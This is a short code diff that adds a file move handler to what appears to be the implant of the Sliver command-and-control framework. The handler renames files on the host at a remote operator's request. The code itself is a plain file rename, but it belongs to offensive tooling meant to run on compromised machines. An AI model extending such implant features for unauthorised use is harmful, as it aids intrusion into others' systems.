@@ -178,6 +178,28 @@ func rmHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func mvHandler(data []byte, resp RPCResponse) {
+	mvReq := &sliverpb.MvReq{}
+	err := proto.Unmarshal(data, mvReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	move := &sliverpb.Mv{}
+	err = os.Rename(mvReq.Src, mvReq.Dst)
+	if err != nil {
+		move.Response = &commonpb.Response{
+			Err: err.Error(),
+		}
+	}
+
+	data, err = proto.Marshal(move)
+	resp(data, err)
+}
+
 func mkdirHandler(data []byte, resp RPCResponse) {
 	mkdirReq := &sliverpb.MkdirReq{}
 	err := proto.Unmarshal(data, mkdirReq)
